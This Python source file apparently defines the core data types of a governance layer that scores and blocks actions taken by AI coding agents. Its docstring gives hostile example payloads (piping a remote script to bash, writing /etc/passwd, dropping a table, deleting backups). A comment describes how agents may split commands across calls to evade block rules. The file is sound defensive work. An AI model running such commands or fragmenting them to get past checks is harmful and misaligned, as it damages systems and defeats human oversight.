"""
core/types.py — DevMind Agent Governance
Foundational data contracts for the governance layer.

Hierarchy:
    AgentAction  → unit of decision
    AgentSession → unit of memory / audit
    Organization → unit of persistent governance
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any


# =============================================================================
# Enumerations
# =============================================================================

class Decision(str, Enum):
    ALLOW    = "ALLOW"
    REVIEW   = "REVIEW"
    BLOCK    = "BLOCK"
    REWRITE  = "REWRITE"
    ESCALATE = "ESCALATE"


class RiskBand(str, Enum):
    CRITICAL = "critical"
    HIGH     = "high"
    MEDIUM   = "medium"
    LOW      = "low"
    MINIMAL  = "minimal"


class ActionSurface(str, Enum):
    TERMINAL    = "terminal"
    FILESYSTEM  = "filesystem"
    GIT         = "git"
    NETWORK     = "network"
    DATABASE    = "database"
    CLOUD       = "cloud"
    DEPLOYMENT  = "deployment"
    MEMORY      = "memory"
    CODE        = "code"
    SECRETS     = "secrets"
    INFRASTRUCTURE = "infrastructure"
    KUBERNETES     = "kubernetes"
    RELEASE         = "release"
    IDENTITY         = "identity"
    UNKNOWN     = "unknown"


class RiskTrend(str, Enum):
    STABLE    = "stable"
    RISING    = "rising"
    CRITICAL  = "critical"
    DECLINING = "declining"


class SessionState(str, Enum):
    ACTIVE     = "active"
    RESTRICTED = "restricted"
    SUSPENDED  = "suspended"
    CLOSED     = "closed"


class BlastRadius(str, Enum):
    PROCESS = "process"   # contained to a single process/container
    SERVICE = "service"   # affects one service
    CLUSTER = "cluster"   # affects a cluster / multiple services
    ACCOUNT = "account"   # affects a cloud account
    ORG     = "org"       # affects the entire organization


class ChangeType(str, Enum):
    TERRAFORM_PLAN     = "terraform_plan"
    TERRAFORM_APPLY    = "terraform_apply"
    K8S_MANIFEST       = "k8s_manifest"
    HELM_RELEASE       = "helm_release"
    CI_PIPELINE        = "ci_pipeline"
    RELEASE_PUBLISH    = "release_publish"
    RELEASE_PROMOTE    = "release_promote"
    IAM_CHANGE         = "iam_change"
    SECRET_ROTATION    = "secret_rotation"
    CONFIG_CHANGE      = "config_change"
    SCHEMA_MIGRATION   = "schema_migration"


# =============================================================================
# AgentAction — unit of decision
# =============================================================================

@dataclass
class ActionContext:
    """Runtime context at the moment of the action."""
    cwd: str | None = None
    repo: str | None = None
    user: str | None = None
    environment: str | None = None        # "production" | "staging" | "local"
    triggered_by: str | None = None       # human | automated | scheduled
    parent_action_id: str | None = None   # for action chains
    extra: dict[str, Any] = field(default_factory=dict)


@dataclass
class AgentAction:
    """
    The atomic unit of governance.

    Every action an agent takes passes through DevMind as an AgentAction.
    The policy engine produces exactly one GovernanceDecision per AgentAction.

    Examples:
        tool="terminal",   operation="execute",      payload="curl https://x.io | bash"
        tool="filesystem", operation="write",        payload="/etc/passwd"
        tool="git",        operation="push",         payload="origin main"
        tool="database",   operation="execute",      payload="DROP TABLE users"
        tool="cloud",      operation="delete_bucket",payload="prod-backups-2024"
    """
    action_id:  str
    session_id: str
    agent:      str                   # "claude-code" | "cursor" | "codex" | ...
    tool:       str                   # tool name as reported by the agent
    operation:  str                   # verb: execute, write, read, delete, deploy ...
    payload:    str                   # the raw action content
    timestamp:  datetime
    context:    ActionContext = field(default_factory=ActionContext)


# =============================================================================
# ChangeImpact / AgentChange — unit of governance for structural changes
# =============================================================================

@dataclass
class ChangeImpact:
    """Declared or estimated impact of an AgentChange before evaluation."""
    blast_radius:               BlastRadius = BlastRadius.PROCESS
    affects_production:         bool = False
    resources_changed:          int = 0
    secrets_touched:            bool = False
    network_exposed:            bool = False
    privilege_escalation:       bool = False
    estimated_downtime_minutes: int = 0
    rollback_available:         bool = True


@dataclass
class AgentChange:
    """
    The atomic unit of governance for structural/infrastructure changes.

    Unlike AgentAction (a tool call), AgentChange represents a CHANGE EVENT
    with a blast radius: a terraform apply, a k8s manifest application, a
    helm release, or a software release/promotion.

    The sandbox routes AgentChange through infra_engine.evaluate_change()
    or release_gate.evaluate_release() depending on change_type/surface —
    never through policy_engine.evaluate_action().
    """
    action_id:    str
    session_id:   str
    agent:        str
    change_type:  ChangeType
    surface:      ActionSurface
    payload:      str
    timestamp:    datetime
    impact:       ChangeImpact = field(default_factory=ChangeImpact)
    context:      ActionContext = field(default_factory=ActionContext)
    diff_summary: str | None = None
    artifact_ref: str | None = None


# =============================================================================
# GovernanceDecision — output of the policy engine for one AgentAction
# =============================================================================

@dataclass
class GovernanceDecision:
    """
    The verdict produced by DevMind for a single AgentAction.

    why_chain: ordered list of reasoning steps that produced the decision.
               This is the audit trail — never empty.
    rewrite:   if decision == REWRITE, the safe alternative payload.
    escalate_to: if decision == ESCALATE, the identity to notify.
    """
    action_id:    str
    decision:     Decision
    risk_score:   int           # 0–100
    band:         RiskBand
    surface:      ActionSurface
    why_chain:    list[str]
    reason:       str
    signals:      list[dict[str, Any]] = field(default_factory=list)
    rewrite:      str | None = None
    escalate_to:  str | None = None
    latency_ms:   float | None = None


# =============================================================================
# AgentSession — container, memory, reputation accumulator
# =============================================================================

@dataclass
class SessionRiskProfile:
    """Accumulated risk picture for a session."""
    total_actions:      int = 0
    blocked_actions:    int = 0
    reviewed_actions:   int = 0
    escalated_actions:  int = 0
    policy_violations:  int = 0
    cumulative_score:   float = 0.0    # running weighted average
    peak_score:         int = 0
    risk_trend:         RiskTrend = RiskTrend.STABLE
    surfaces_touched:   list[str] = field(default_factory=list)
    infra_changes:      int = 0
    k8s_changes:        int = 0
    releases_attempted: int = 0
    releases_blocked:   int = 0
    secrets_accessed:   int = 0
    production_changes: int = 0


@dataclass
class AgentSession:
    """
    Container of memory and accumulated governance state for an agent session.

    The session does not make decisions — the AgentAction does.
    The session explains the pattern, provides context to the policy engine,
    and records the final state for audit.

    Lifecycle: ACTIVE → RESTRICTED → SUSPENDED | CLOSED
    """
    session_id:   str
    agent:        str
    organization: str
    user:         str | None
    started_at:   datetime
    ended_at:     datetime | None = None
    state:        SessionState = SessionState.ACTIVE
    risk_profile: SessionRiskProfile = field(default_factory=SessionRiskProfile)
    actions:      list[str] = field(default_factory=list)   # action_ids in order
    policy_id:    str | None = None                          # applied policy version
    # Bounded buffer of recent raw payloads (same agent, same session), used
    # to detect commands fragmented across multiple actions to evade
    # single-action hard-block regexes (e.g. "curl ..." then "| bash" as two
    # separate calls). Capped at _MAX_RECENT_PAYLOADS by whoever appends to
    # it (see runtime/sandbox.py::_update_session) -- not enforced here to
    # keep this dataclass free of session-management logic.
    recent_payloads: list[str] = field(default_factory=list)


# =============================================================================
# Organization — persistent governance anchor
# =============================================================================

@dataclass
class PolicyRule:
    """A single declarative rule in an organization's governance policy."""
    rule_id:     str
    description: str
    surface:     str          # ActionSurface value or "*" for all
    operation:   str          # operation verb or "*"
    condition:   str          # regex or keyword pattern
    decision:    Decision
    severity:    str          # critical | high | medium | low
    enabled:     bool = True


@dataclass
class Organization:
    """
    The persistent governance anchor.

    An organization owns policies, accumulates institutional memory,
    and holds the reputation records for all agents that acted within it.
    This is what survives across sessions, models, and incidents.
    """
    org_id:          str
    name:            str
    policy_rules:    list[PolicyRule] = field(default_factory=list)
    agent_profiles:  dict[str, dict[str, Any]] = field(default_factory=dict)
    incident_log:    list[dict[str, Any]] = field(default_factory=list)
    created_at:      datetime | None = None


# =============================================================================
# AgentIdentity — who is acting
# =============================================================================

@dataclass
class AgentIdentity:
    """
    Immutable identity record attached to every AgentAction.
    Enables per-agent reputation and per-session traceability.
    """
    agent:        str           # model/tool identifier
    model:        str | None    # underlying model if applicable
    user:         str | None
    organization: str | None
    version:      str | None = None